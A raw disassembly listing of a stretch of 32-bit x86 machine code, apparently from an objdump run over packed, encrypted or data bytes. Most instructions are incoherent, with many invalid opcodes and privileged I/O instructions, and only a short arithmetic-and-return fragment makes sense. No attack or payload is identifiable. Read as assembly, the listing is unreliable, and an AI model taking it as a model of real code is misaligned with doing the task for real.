  41c751:	pop    esp
  41c752:	rcl    DWORD PTR [ebx],cl
  41c754:	fs (bad) 
  41c756:	xor    BYTE PTR [ecx-0x1d],ch
  41c759:	mov    bh,0xf5
  41c75b:	inc    edx
  41c75c:	xchg   esi,eax
  41c75d:	mov    bl,dh
  41c75f:	in     al,0xee
  41c761:	sti    
  41c762:	icebp  
  41c763:	mov    ah,0x7d
  41c765:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c766:	out    dx,eax
  41c767:	mov    al,0x81
  41c769:	(bad)  
  41c76a:	mov    DWORD PTR ds:0x5a11a6f,esi
  41c770:	inc    eax
  41c771:	(bad)  
  41c772:	sbb    ch,BYTE PTR [ebp+0x15c537dd]
  41c778:	pushf  
  41c779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c77a:	arpl   WORD PTR [edi+0x6811d007],ax
  41c780:	inc    ecx
  41c781:	out    dx,al
  41c782:	pop    ss
  41c783:	pop    ebp
  41c784:	(bad)
  41c787:	shl    DWORD PTR [esi+0x24898d2d],cl
  41c78d:	mov    ds:0x9c2804a8,eax
  41c792:	mul    DWORD PTR ds:0xced0db4
  41c798:	je     0x41c812
  41c79a:	sub    ebx,DWORD PTR [ebx+0x11]
  41c79d:	cld    
  41c79e:	jecxz  0x41c7af
  41c7a0:	repz push esi
  41c7a2:	or     eax,0x81ec7e6b
  41c7a7:	mov    al,0xc2
  41c7a9:	add    cl,0x27
  41c7ac:	or     esi,esi
  41c7ae:	leave  
  41c7af:	sub    BYTE PTR [ebp+0x258ba85b],dh
  41c7b5:	pop    es
  41c7b6:	or     eax,0x7c756ce2
  41c7bb:	xor    DWORD PTR [edi+0x1d],ecx
  41c7be:	(bad)  
  41c7bf:	and    bl,BYTE PTR [edx]
  41c7c1:	bound  eax,QWORD PTR [ebx]
  41c7c3:	pop    ebp
  41c7c4:	shl    edi,cl
  41c7c6:	cwde   
  41c7c7:	inc    esi
  41c7c8:	push   edi
  41c7c9:	(bad)  
  41c7ca:	fmul   st,st(5)
  41c7cc:	xchg   edi,eax
  41c7cd:	(bad)  [edx-0x2f640c75]
  41c7d3:	jge    0x41c7dc
  41c7d5:	aas    
  41c7d6:	cwde   
  41c7d7:	es mov ch,0x6c
  41c7da:	jae    0x41c810
  41c7dc:	scas   al,BYTE PTR es:[edi]
  41c7dd:	ins    DWORD PTR es:[edi],dx
  41c7de:	fnstsw WORD PTR [eax+0x2c]
  41c7e1:	das    
  41c7e2:	out    dx,al
  41c7e3:	cs das 
  41c7e5:	xchg   al,ah
  41c7e7:	cmc    
  41c7e8:	mov    ebx,ecx
  41c7ea:	or     edx,ecx
  41c7ec:	jecxz  0x41c854
  41c7ee:	sub    DWORD PTR ds:0x981b0a8,0x76
  41c7f5:	pusha  
  41c7f6:	dec    ecx
  41c7f7:	sbb    eax,0x509a9204
  41c7fc:	push   ecx
  41c7fd:	jmp    0xb0f8:0x99379462
  41c804:	inc    eax
  41c805:	enter  0x7933,0xf7
  41c809:	push   0x660c9623
  41c80e:	hlt    
  41c80f:	inc    ebx
  41c810:	push   ss
  41c811:	nop
  41c812:	nop
  41c813:	mov    WORD PTR [ecx],cs
  41c815:	dec    edx
  41c816:	pop    ecx
  41c817:	sti    
  41c818:	jns    0x41c87d
  41c81a:	sti    
  41c81b:	sbb    DWORD PTR [ecx],0x65
  41c81e:	xchg   BYTE PTR [esi],dh
  41c820:	sub    eax,0x7cd3b715
  41c825:	sti    
  41c826:	in     eax,0xa9
  41c828:	fistp  WORD PTR [ebp-0x8]
  41c82b:	int3   
  41c82c:	test   DWORD PTR [edi-0x5aecf3c9],edi
  41c832:	push   cs
  41c833:	adc    al,0x81
  41c835:	sar    BYTE PTR [ecx-0x3828bff4],0x93
  41c83c:	call   0x9b12:0xbe50c8d4
  41c843:	pop    ebx
  41c844:	pusha  
  41c845:	fld    DWORD PTR [eax-0x2171a586]
  41c84b:	leave  
  41c84c:	(bad)  
  41c84d:	push   esi
  41c84e:	jno    0x41c801
  41c850:	jg     0x41c8af
  41c852:	lea    ebx,[esi+0x3434bb29]
  41c858:	inc    BYTE PTR [ecx-0xf3f60d9]
  41c85e:	icebp  
  41c85f:	xchg   esi,eax
  41c860:	add    bh,BYTE PTR [esi+0x3f]
  41c863:	daa    
  41c864:	xor    DWORD PTR [ecx],ebx
  41c866:	jns    0x41c7ea
  41c868:	adc    al,0xed
  41c86a:	xchg   ebp,eax
  41c86b:	cld    
  41c86c:	leave  
  41c86d:	ret    0x868b
  41c870:	ror    bl,0x43
  41c873:	mov    ebp,DWORD PTR [ecx]
  41c875:	out    dx,eax
  41c876:	jno    0x41c8ba
  41c878:	cmc    
  41c879:	dec    esp
  41c87a:	lds    edi,FWORD PTR [esi+0x66f493f5]
  41c880:	ret    
  41c881:	mov    dl,0x6c
  41c883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c884:	es stc 
  41c886:	es call 0xf00cf42e
  41c88c:	arpl   WORD PTR [edi-0x47],di
  41c88f:	fisubr WORD PTR [edx]
  41c891:	sbb    al,BYTE PTR [ebx-0x5e3eb465]
  41c897:	int    0x95
  41c899:	out    dx,eax
  41c89a:	cmc    
  41c89b:	repnz mov bl,0x2d
  41c89e:	add    eax,ecx
  41c8a0:	mov    ecx,DWORD PTR [ebp+0xc]
  41c8a3:	imul   eax,ecx
  41c8a6:	add    eax,DWORD PTR [ebp+0x8]
  41c8a9:	mov    DWORD PTR [ebp+0xc],eax
  41c8ac:	mov    eax,DWORD PTR [ebp+0xc]
  41c8af:	pop    esi
  41c8b0:	leave  
  41c8b1:	ret    0x8
  41c8b4:	pop    ss
  41c8b5:	or     al,0x84
  41c8b7:	repz lahf 
  41c8b9:	sti    
  41c8ba:	ja     0x41c8a8
  41c8bc:	stos   BYTE PTR es:[edi],al
  41c8bd:	mov    edx,0xaf2a88e2
  41c8c2:	cmp    DWORD PTR ds:0x185af,ebp
  41c8c8:	lods   eax,DWORD PTR ds:[esi]
  41c8c9:	add    BYTE PTR [eax],al
  41c8cb:	add    dl,al
  41c8cd:	cmp    BYTE PTR [ebp+0x56],bl
  41c8d0:	mov    ebx,0x95e082f1
  41c8d5:	sub    eax,0xd7a202fa
  41c8da:	push   0xd20e2981
  41c8df:	push   ebp
  41c8e0:	(bad)  
  41c8e1:	pop    ebx
  41c8e2:	cli    
  41c8e3:	out    0xa3,eax
  41c8e5:	ror    bh,cl
  41c8e7:	adc    ch,BYTE PTR [ebx]
  41c8e9:	push   eax
  41c8ea:	int    0xea
  41c8ec:	mov    esi,0x3c608a77
  41c8f1:	and    al,0xb2
  41c8f3:	pushf  
  41c8f4:	mov    ch,0x6b
  41c8f6:	pop    eax
  41c8f7:	xchg   ebx,eax
  41c8f8:	jmp    0x99f2:0x7098b813
  41c8ff:	or     cl,BYTE PTR [edi]
  41c901:	sbb    eax,0x77a57151
  41c906:	mov    ah,0xad
  41c908:	mov    dh,0xf7
  41c90a:	mov    ecx,eax
  41c90c:	pcmpgtw mm2,QWORD PTR [edx-0x48acec17]
  41c913:	mov    bl,0x68
  41c915:	cmp    ecx,edx
  41c917:	push   edi
  41c918:	rcl    DWORD PTR [esp+ebp*4],1
  41c91b:	dec    edx
  41c91c:	and    eax,0x40e4a82
  41c921:	cmp    dl,dl
  41c923:	inc    ebx
  41c924:	out    dx,eax
  41c925:	add    ebx,esi
  41c927:	jmp    0x501dafd
  41c92c:	hlt    
  41c92d:	pusha  
  41c92e:	mov    ebp,0x103f5856
  41c933:	and    dh,BYTE PTR ds:0x346f29e7
  41c939:	pop    ebx
  41c93a:	in     al,dx
  41c93b:	loope  0x41c980
  41c93d:	inc    eax
  41c93e:	je     0x41c929
  41c940:	or     eax,ebx
  41c942:	cmp    eax,edx
  41c944:	sub    eax,0xdbefc6bb
  41c949:	dec    esp
  41c94a:	(bad)  
  41c94b:	imul   edx,DWORD PTR [edi+0x447c1a3d],0xfffffffc
  41c952:	cmp    DWORD PTR [ecx],esp
  41c954:	jecxz  0x41c93e
  41c956:	lea    esi,[ecx+0x5d]
  41c959:	cmp    eax,0xe579d9ec
  41c95e:	js     0x41c92e
  41c960:	fisub  DWORD PTR [ebx-0x27]
  41c963:	xor    cl,cl
  41c965:	iret   
  41c966:	mov    ds:0xc41c3074,eax
  41c96b:	or     al,bl
  41c96d:	outs   dx,BYTE PTR ds:[esi]
  41c96e:	sti    
  41c96f:	int3   
  41c970:	add    al,0x16
  41c972:	pusha  
  41c973:	cwde   
  41c974:	jne    0x41c972
  41c976:	sbb    BYTE PTR [edx+0xa3],ah
	...
  41c984:	shr    DWORD PTR [esp+edx*1],1
  41c987:	adc    edi,ebp
  41c989:	cmp    edx,edi
  41c98b:	out    dx,al
  41c98c:	pop    edi
  41c98d:	xchg   bx,ax
  41c98f:	push   0x8faa3638
  41c994:	pop    esp
  41c995:	xchg   BYTE PTR [ecx],al
  41c997:	add    BYTE PTR [ebp+0x6e000000],ch
  41c99d:	cld    
  41c99e:	jmp    0x41c9bb
  41c9a0:	add    DWORD PTR [edi-0x28],esp
  41c9a3:	(bad)  
  41c9a4:	sub    ch,ch
  41c9a6:	sub    BYTE PTR [esi-0x374f78f8],dh
  41c9ac:	jmp    0x12ab:0x42f96ce0
  41c9b3:	scas   eax,DWORD PTR es:[edi]
  41c9b4:	push   esi
  41c9b5:	xchg   esi,eax
  41c9b6:	and    ebp,esp
  41c9b8:	(bad)  
  41c9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9ba:	fsub   QWORD PTR [ecx-0x54]
  41c9bd:	sbb    eax,0x70aec902
  41c9c2:	pop    esi
  41c9c3:	stc    
  41c9c4:	or     al,0x5b
  41c9c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9c7:	call   0xeffa3d63
  41c9cc:	cmp    eax,0x5e93ff71
  41c9d1:	jmp    0x83a8:0x91d22fd8
  41c9d8:	jns    0x41c9d3
  41c9da:	stos   DWORD PTR es:[edi],eax
  41c9db:	push   ss
  41c9dc:	adc    DWORD PTR [edi+0x4ddaef83],edi
  41c9e2:	dec    edx
  41c9e3:	sbb    ebx,edi
  41c9e5:	icebp  
  41c9e6:	or     DWORD PTR [ebp+0x70a629cd],eax
  41c9ec:	jg     0x41ca6b
  41c9ee:	adc    edx,DWORD PTR [ecx]
  41c9f0:	mov    ah,0x7f
  41c9f2:	xlat   BYTE PTR ds:[bx]
  41c9f4:	add    ecx,DWORD PTR [edi-0x754f6e85]
  41c9fa:	push   ecx
  41c9fb:	popa   
  41c9fc:	scas   al,BYTE PTR es:[edi]
  41c9fd:	out    0xaf,eax
  41c9ff:	add    dl,BYTE PTR [eax+0x3b9467dd]
  41ca05:	in     eax,0xf9
  41ca07:	and    eax,0xabff1fdb
  41ca0c:	jae    0x41c9f9
  41ca0e:	cdq    
  41ca0f:	push   esi
  41ca10:	push   cs
  41ca11:	mov    edi,0x858d2049
  41ca16:	shr    DWORD PTR [edi],0xed
  41ca19:	out    dx,eax
  41ca1a:	adc    ecx,eax
  41ca1c:	add    bh,BYTE PTR [edi]
  41ca1e:	push   ebx
  41ca1f:	pop    ebx
  41ca20:	mov    ecx,edx
  41ca22:	and    al,BYTE PTR [eax-0x24]
  41ca25:	icebp  
  41ca26:	les    eax,FWORD PTR [edi+0x3e3a05bd]
  41ca2c:	out    dx,eax
  41ca2d:	hlt    
  41ca2e:	(bad)  
  41ca2f:	ror    edx,cl
  41ca31:	iret   
  41ca32:	bnd ja 0x41ca8a
  41ca35:	pop    ss
  41ca36:	mov    WORD PTR ds:0x251adde4,?
  41ca3c:	mov    ebp,0x583cacff
  41ca41:	pop    ds
  41ca42:	shl    DWORD PTR [esi+edx*8-0x75],cl
  41ca46:	mov    esp,0xf154
	...
  41ca53:	add    BYTE PTR [edi],bl
  41ca55:	sub    esp,DWORD PTR [eax-0x60404bc1]
  41ca5b:	sub    eax,esi
  41ca5d:	add    BYTE PTR [edi+eax*2+0x1ddcc4d0],0x9
  41ca65:	xchg   DWORD PTR [ecx],eax
  41ca67:	add    BYTE PTR [ebp+0x1b000000],ch
  41ca6d:	ja     0x41ca9a
  41ca6f:	call   FWORD PTR [edi-0x4]
  41ca72:	adc    BYTE PTR [edx],cl
  41ca74:	mov    ch,0x15
  41ca76:	pusha  
  41ca77:	test   DWORD PTR [esi-0x33],ebp
  41ca7a:	cmp    al,0x9c
  41ca7c:	cmp    edx,edx
  41ca7e:	xor    DWORD PTR [eax-0x78],eax
  41ca81:	cmc    
  41ca82:	xlat   BYTE PTR ds:[ebx]
  41ca83:	mov    edi,0xdcbf2dd
  41ca88:	jns    0x41ca3c
  41ca8a:	dec    ebp
  41ca8b:	adc    BYTE PTR [esi],bl
  41ca8d:	cmp    al,0x19
  41ca8f:	pslld  mm5,mm3
  41ca92:	mov    ebx,0x310c3142
  41ca97:	xchg   DWORD PTR [edx-0x4a],edx
  41ca9a:	lds    esp,FWORD PTR [esi-0x2167d5b0]
  41caa0:	test   DWORD PTR [ebx+0x28],ecx
  41caa3:	inc    ebx
  41caa4:	pop    ss
  41caa5:	adc    al,0x75
  41caa7:	jg     0x41ca5c
  41caa9:	fld    TBYTE PTR [edx+eiz*2+0x73]
  41caad:	push   ebx
  41caae:	mov    cl,0x82
  41cab0:	addr16 mov ah,0x86
  41cab3:	cmp    ebx,DWORD PTR [ecx]
  41cab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cab6:	dec    ebx
  41cab7:	(bad)  
  41cab8:	jg     0x41caa3
  41caba:	adc    BYTE PTR [edi-0x2a615b4d],bl
  41cac0:	mov    eax,ds:0x189b4efc
  41cac5:	jge    0x41caf7
  41cac7:	dec    ebp
  41cac8:	sub    ebp,esi
  41caca:	mov    ecx,0xf6fe4452
  41cacf:	jo     0x41caf8
  41cad1:	cs push 0x49
  41cad4:	add    al,BYTE PTR [edi]
  41cad6:	call   0x35344760
  41cadb:	imul   esi,ecx,0xab978bb8
  41cae1:	adc    al,0x6d
  41cae3:	mov    BYTE PTR [ecx],al
  41cae5:	inc    esi
  41cae6:	jle    0x41caa8
  41cae8:	xchg   DWORD PTR [eax+0x70],ebx
  41caeb:	cmp    dl,cl
  41caed:	inc    edi
  41caef:	xor    eax,DWORD PTR fs:[ebp+0x778eb3b2]
  41caf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caf7:	js     0x41ca8d
  41caf9:	shl    BYTE PTR [edx],1
  41cafb:	mov    DWORD PTR [ecx+0x47],eax
  41cafe:	outs   dx,BYTE PTR ds:[esi]
  41cb00:	cld    
  41cb01:	jne    0x41cb37
  41cb03:	outs   dx,DWORD PTR ds:[esi]
  41cb04:	push   ds
  41cb05:	dec    edi
  41cb06:	cmovl  esi,DWORD PTR [edi-0x75]
  41cb0a:	mov    edx,0xab6cc635
  41cb0f:	ins    BYTE PTR es:[edi],dx
  41cb10:	mov    WORD PTR [ecx-0x55],ds
  41cb13:	adc    eax,0xf786ed32
  41cb18:	ins    BYTE PTR es:[edi],dx
	...
  41cb21:	add    BYTE PTR [eax],al
  41cb23:	add    BYTE PTR [edi],ch
  41cb25:	and    al,0xf0
  41cb27:	aam    0xfb
  41cb29:	aam    0x2f
  41cb2b:	jmp    FWORD PTR [esi+0x33]
  41cb2e:	je     0x41cae6
  41cb30:	in     eax,0xb9
  41cb32:	into   
  41cb33:	lods   al,BYTE PTR ds:[esi]
  41cb34:	mov    dh,0x87
  41cb36:	add    DWORD PTR [eax],eax
  41cb38:	lods   eax,DWORD PTR ds:[esi]
  41cb39:	add    BYTE PTR [eax],al
  41cb3b:	add    BYTE PTR [edi*2+0x4f84eb6a],dl
  41cb42:	psubusb mm5,QWORD PTR [edx]
  41cb45:	pop    ebp
  41cb46:	xor    dl,BYTE PTR [ebx]
  41cb48:	icebp  
  41cb49:	repnz shl DWORD PTR ds:0xc7965d00,1
  41cb50:	dec    esi
  41cb51:	popf   
  41cb52:	pop    edx
  41cb53:	sub    eax,DWORD PTR [edx+0x6a52e053]
  41cb59:	jle    0x41cb28
  41cb5b:	je     0x41cb61
  41cb5d:	repz push edx
  41cb5f:	sbb    al,0xf3
  41cb61:	jecxz  0x41cba5
  41cb63:	test   DWORD PTR [edi],0xf16dc808
  41cb69:	cmc    
  41cb6a:	push   edi
  41cb6b:	add    bh,BYTE PTR [ecx-0xd]
  41cb6e:	jecxz  0x41cbe0
  41cb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb71:	(bad)  
  41cb72:	mov    eax,0x1b8dfee1
  41cb77:	push   ebp
  41cb78:	aaa    
  41cb79:	sbb    esp,DWORD PTR [esi]
  41cb7b:	push   ds
  41cb7c:	push   edx
  41cb7d:	sbb    BYTE PTR [eax-0x59],al
  41cb80:	cmp    ebx,DWORD PTR [ebx]
  41cb82:	and    eax,0xb6485a4e
  41cb87:	scas   eax,DWORD PTR es:[edi]
  41cb88:	push   esi
  41cb89:	fst    DWORD PTR [edi+0x10]
  41cb8c:	fisubr DWORD PTR [esi-0x26]
  41cb8f:	add    DWORD PTR [esp+esi*4-0x62],ebp
  41cb93:	fdivr  DWORD PTR [edi+0xa]
  41cb96:	inc    esp
  41cb97:	cld    
  41cb98:	jge    0x41cb59
  41cb9a:	sbb    BYTE PTR [ebx-0x70],ch
  41cb9d:	cmp    BYTE PTR [eax],ah
  41cb9f:	in     eax,0x42
  41cba1:	int    0xe6
  41cba3:	imul   edi,DWORD PTR [edx+0x38],0xb5f75c61
  41cbaa:	pop    eax
  41cbab:	in     al,dx
  41cbac:	dec    edx
  41cbad:	ds push edi
  41cbaf:	dec    eax
  41cbb0:	test   bh,0x9d
  41cbb3:	(bad)  
  41cbb4:	mov    eax,ds:0x7f45256c
  41cbb9:	pop    edi
  41cbba:	pusha  
  41cbbb:	push   ebx
  41cbbc:	mov    ebp,0xe44a2737
  41cbc1:	rol    DWORD PTR [ecx],1
  41cbc3:	mov    al,0xe5
  41cbc5:	stos   DWORD PTR es:[edi],eax
  41cbc6:	fistp  DWORD PTR [eax+0x69]
  41cbc9:	cwde   
  41cbca:	loopne 0x41cb7f
  41cbcc:	and    ebx,DWORD PTR [edi+0x5e817154]
  41cbd2:	inc    ebp
  41cbd3:	int3   
  41cbd4:	hlt    
  41cbd5:	out    0x68,eax
  41cbd7:	pop    eax
  41cbd8:	jle    0x41cc30
  41cbda:	fld    QWORD PTR [ebx-0x5d1b3156]
  41cbe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbe1:	mov    ebx,0x90fb252
  41cbe6:	and    BYTE PTR ds:0x60,dh
	...
  41cbf4:	retf   0x76a0
  41cbf7:	dec    ebp
  41cbf8:	jle    0x41cbd9
  41cbfa:	sti    
  41cbfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cbfc:	mov    bh,0x83
  41cbfe:	dec    edi
  41cbff:	mov    ds:0x2041c5bc,al
  41cc04:	arpl   WORD PTR [eax+0xad0001],cx
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	sbb    DWORD PTR ds:0x5906e749,ebx
  41cc12:	xlat   BYTE PTR ds:[ebx]
  41cc13:	sub    DWORD PTR [ecx+0x30],esp
  41cc16:	clc    
  41cc17:	mov    BYTE PTR [ebx+0x66d0b27],bl
  41cc1d:	pusha  
  41cc1e:	jne    0x41cc52
  41cc20:	pushf  
  41cc21:	(bad)  
  41cc22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc23:	xor    BYTE PTR [ebp+0x7c4850b9],dl
  41cc29:	sbb    ebp,DWORD PTR [esi+0x1c]
  41cc2c:	mov    cl,BYTE PTR [ebx]
  41cc2e:	xor    ah,BYTE PTR [eax-0x31]
  41cc31:	dec    edi
  41cc32:	into   
  41cc33:	enter  0xb550,0x37
  41cc37:	repnz or dl,BYTE PTR [ecx+0xc]
  41cc3b:	(bad)  [ecx-0x6be6bbc5]
  41cc41:	pop    ebx
  41cc42:	fs in  al,dx
  41cc44:	das    
  41cc45:	test   al,0x16
  41cc47:	adc    BYTE PTR [edx+0x3c],al
  41cc4a:	dec    ebx
  41cc4b:	repz dec edx
  41cc4d:	enter  0x76a4,0x10
  41cc51:	xor    edx,DWORD PTR [edx]
  41cc53:	sbb    DWORD PTR [ebx],eax
  41cc55:	jae    0x41cc04
  41cc57:	xchg   esp,eax
  41cc58:	xlat   BYTE PTR ds:[ebx]
  41cc59:	and    dl,cl
  41cc5b:	mov    eax,DWORD PTR [edx+0x48]
  41cc5e:	or     eax,0xb63050e
  41cc63:	dec    edi
  41cc64:	fimul  DWORD PTR [edi+0x29609753]
  41cc6a:	adc    al,0xf3
  41cc6c:	or     al,BYTE PTR [ebx]
  41cc6e:	or     al,0xa7
  41cc70:	pop    esp
  41cc71:	inc    ecx
  41cc72:	lods   eax,DWORD PTR ds:[esi]
  41cc73:	inc    esp
  41cc74:	sti    
  41cc75:	sub    esp,DWORD PTR [eax-0x9e32e90]
  41cc7b:	adc    ebx,DWORD PTR [ecx-0xf1abb11]
  41cc81:	scas   al,BYTE PTR es:[edi]
  41cc82:	ja     0x41cc49
  41cc84:	xlat   BYTE PTR ds:[ebx]
  41cc85:	idiv   BYTE PTR [ecx+0x2f]
  41cc88:	xchg   edx,eax
  41cc89:	push   es
  41cc8a:	sbb    ch,ch
  41cc8c:	sub    DWORD PTR [ebp-0x6c],edi
  41cc8f:	xchg   edx,eax
  41cc90:	fild   WORD PTR ds:0x8041cd99
  41cc96:	(bad)  
  41cc97:	or     al,0x55
  41cc99:	dec    eax
  41cc9a:	hlt    
  41cc9b:	pop    ss
  41cc9c:	pusha  
  41cc9d:	mov    esp,0xac757618
  41cca2:	fs sub al,0xef
  41cca5:	jecxz  0x41cc69
  41cca7:	xchg   ecx,eax
  41cca8:	xor    DWORD PTR [esi],edi
  41ccaa:	pushf  
  41ccab:	sub    ebx,esi
  41ccad:	jnp    0x41cc37
  41ccaf:	inc    ecx
  41ccb0:	and    dl,BYTE PTR [edx]
  41ccb2:	scas   eax,DWORD PTR es:[edi]
  41ccb3:	gs mov bl,0x98
  41ccb6:	pop    edx
  41ccb7:	push   esp
  41ccb8:	mov    edx,0x0
  41ccbd:	add    BYTE PTR [eax],al
  41ccbf:	add    BYTE PTR [eax],al
  41ccc1:	add    BYTE PTR [eax],al
  41ccc3:	add    dh,al
  41ccc5:	out    dx,al
  41ccc6:	lods   al,BYTE PTR ds:[esi]
  41ccc7:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  41ccce:	stc    
  41cccf:	stc    
  41ccd0:	mov    ch,dl
  41ccd2:	inc    esi
  41ccd3:	inc    esp
  41ccd4:	adc    BYTE PTR [ecx+0xad0001],cl
  41ccda:	add    BYTE PTR [eax],al
  41ccdc:	xchg   esi,eax
  41ccdd:	repz into 
  41ccdf:	cmp    al,0xa6
  41cce1:	push   ss
  41cce2:	adc    DWORD PTR [edx+0x4e],edi
  41cce5:	mov    bl,0x7b
  41cce7:	mov    ds,WORD PTR [ecx+0x3c1d29cb]
  41cced:	retf   0x1dc
  41ccf0:	adc    ebp,ebp
  41ccf2:	ins    DWORD PTR es:[edi],dx
  41ccf3:	mov    cl,0xc4
  41ccf5:	push   edi
  41ccf6:	cs xor ch,bl
  41ccf9:	push   ds
  41ccfa:	mov    al,ds:0x94887244
  41ccff:	push   0x44
  41cd01:	out    0x8a,eax
  41cd03:	fist   WORD PTR [edi+0x6e45ad8e]
  41cd09:	cld    
  41cd0a:	mov    es,WORD PTR [ebx-0x42]
  41cd0d:	test   DWORD PTR [edx+0x5128869b],eax
  41cd13:	sub    dl,al
  41cd15:	ror    BYTE PTR [eax-0x553a49b0],1
  41cd1b:	adc    eax,0xcc6abe2c
  41cd20:	fldpi  
  41cd22:	sti    
  41cd23:	mov    cl,0x76
  41cd25:	inc    eax
  41cd26:	popf   
  41cd27:	fidiv  DWORD PTR [ebx]
  41cd29:	aas    
  41cd2a:	cwde   
  41cd2b:	pop    DWORD PTR ds:0x47fe7143
  41cd31:	push   eax
  41cd32:	jp     0x41ccc3
  41cd34:	scas   eax,DWORD PTR es:[edi]
  41cd35:	in     al,dx
  41cd36:	mov    ss,esi
  41cd38:	pop    edx
  41cd39:	xor    al,0xed
  41cd3b:	mov    esi,0x6246e8cb
  41cd40:	sub    al,0x18
  41cd42:	lea    edx,[edi+0x68]
  41cd45:	mov    DWORD PTR [edx],ebx
  41cd47:	in     al,dx
  41cd48:	sub    DWORD PTR [eax+0x5ac795c9],edx
  41cd4e:	add    eax,0x1c8e8471
  41cd53:	fbld   TBYTE PTR [eax+esi*4+0x6c139072]
  41cd5a:	lahf   
  41cd5b:	fistp  DWORD PTR [edx]
  41cd5d:	test   eax,0x2afdab37
  41cd62:	(bad)  
  41cd64:	add    ebx,DWORD PTR [ebx+0x59]
  41cd67:	hlt    
  41cd68:	and    dl,0xc6
  41cd6b:	push   es
  41cd6c:	sub    ah,BYTE PTR [ecx-0x6e]
  41cd6f:	das    
  41cd70:	imul   edi,DWORD PTR [eax],0x7a
  41cd73:	add    edi,DWORD PTR [ecx-0x72]
  41cd76:	les    ebx,FWORD PTR [eax-0x63d4df9b]
  41cd7c:	add    al,0x8f
  41cd7e:	sbb    DWORD PTR [ebp-0x79],0x8f0bfe65
  41cd85:	jp     0x41cd8d
  41cd87:	xchg   esi,eax
  41cd88:	daa    
	...
  41cd91:	add    BYTE PTR [eax],al
  41cd93:	add    BYTE PTR [edx+0x34],dl
  41cd96:	inc    eax
  41cd97:	gs data16 jne 0x41ce12
  41cd9b:	aaa    
  41cd9c:	push   0x5d6a4e09
  41cda1:	jbe    0x41cdbb
  41cda3:	cmp    bh,BYTE PTR [ebp-0x52fffe77]
  41cda9:	add    BYTE PTR [eax],al
  41cdab:	add    BYTE PTR [ecx-0x54],bl
  41cdae:	pop    esp
  41cdaf:	out    dx,al
  41cdb0:	mov    al,0xc2
  41cdb2:	rcr    DWORD PTR fs:[edx+0x78],1
  41cdb6:	pop    eax
  41cdb7:	imul   esp,DWORD PTR [esi+0x4f],0xffffffaa
  41cdbb:	retf   
  41cdbc:	scas   al,BYTE PTR es:[edi]
  41cdbd:	in     al,0x91
  41cdbf:	xor    esi,eax
  41cdc1:	dec    eax
  41cdc2:	xchg   dh,dh
  41cdc4:	cmp    BYTE PTR [ebx],cl
  41cdc6:	aam    0x6e
  41cdc8:	lahf   
  41cdc9:	out    dx,al
  41cdca:	test   ah,dh
  41cdcc:	add    ebx,DWORD PTR [ebp+0x436eaf29]
  41cdd2:	adc    al,0x4c
  41cdd4:	pop    esp
  41cdd5:	scas   al,BYTE PTR es:[edi]
  41cdd6:	xor    DWORD PTR [ecx],ecx
  41cdd8:	pushf  
  41cdd9:	cmp    DWORD PTR [esi+ecx*1+0x17de4b6a],esp
  41cde0:	add    eax,0xe87cd067
  41cde5:	lock mov esp,0x3df054ed
  41cdeb:	cwde   
  41cdec:	addr16 gs mov ebp,cs
  41cdf0:	int    0xa3
  41cdf2:	sub    eax,0xcaf40f37
  41cdf7:	sub    DWORD PTR [ebp-0x34],ecx
  41cdfa:	mov    edx,0x3601dc62
  41cdff:	and    DWORD PTR [edx],ebp
  41ce01:	icebp  
  41ce02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce03:	push   ebx
  41ce04:	adc    eax,0x8b236a44
  41ce09:	xchg   BYTE PTR [esi+0x6b],cl
  41ce0c:	imul   ecx,DWORD PTR [ecx+0x7ee3b1ed],0x1c58f521
  41ce16:	dec    esp
  41ce17:	pop    ecx
  41ce18:	mov    cs:0xfc059900,al
  41ce1e:	(bad)  [edx-0x19566ca3]
  41ce24:	retf   
  41ce25:	push   es
  41ce26:	xchg   esi,eax
  41ce27:	icebp  
  41ce28:	test   al,0xfd
  41ce2a:	mov    BYTE PTR [ecx-0x57],ch
  41ce2d:	dec    esi
  41ce2e:	es arpl dx,dx
  41ce31:	shl    BYTE PTR [ecx],1
  41ce33:	mov    eax,0x8afe1111
  41ce38:	scas   al,BYTE PTR es:[edi]
  41ce39:	inc    ecx
  41ce3a:	retf   
  41ce3b:	dec    ebp
  41ce3c:	inc    ecx
  41ce3d:	mov    esi,DWORD PTR [edx+0x40]
  41ce40:	xchg   DWORD PTR [edi],edi
  41ce42:	mov    ecx,0x1053a20e
  41ce47:	sti    
  41ce48:	push   esi
  41ce49:	arpl   bx,di
  41ce4b:	rcl    DWORD PTR [ebx-0x3ca3a354],1
  41ce51:	and    DWORD PTR [edx],ebx
  41ce53:	add    dh,0xe8
  41ce56:	test   DWORD PTR [edx-0x13],edi
	...
  41ce61:	add    BYTE PTR [eax],al
  41ce63:	add    BYTE PTR [edx],dl
  41ce65:	mov    edx,0xe6f8c6d8
  41ce6a:	push   ds
  41ce6b:	(bad)  
  41ce6c:	adc    bl,dh
  41ce6e:	cwde   
  41ce6f:	out    dx,al
  41ce70:	xchg   DWORD PTR [edx-0x14],edi
  41ce73:	add    bl,dl
  41ce75:	stos   BYTE PTR es:[edi],al
  41ce76:	add    DWORD PTR [eax],eax
  41ce78:	lods   eax,DWORD PTR ds:[esi]
  41ce79:	add    BYTE PTR [eax],al
  41ce7b:	add    ch,dh
  41ce7d:	scas   eax,DWORD PTR es:[edi]
  41ce7e:	cs call 0xe86b:0x30d92c85
  41ce86:	dec    edi
  41ce87:	sbb    al,dl
  41ce89:	and    al,0xdb
  41ce8b:	xor    eax,0x84c374f2
  41ce90:	cmp    dh,BYTE PTR [ecx]
  41ce92:	adc    al,BYTE PTR [esi]
  41ce94:	out    0xaa,eax
  41ce96:	mov    eax,ds:0x7754fbe4
  41ce9b:	xlat   BYTE PTR ds:[ebx]
  41ce9c:	cmc    
  41ce9d:	sti    
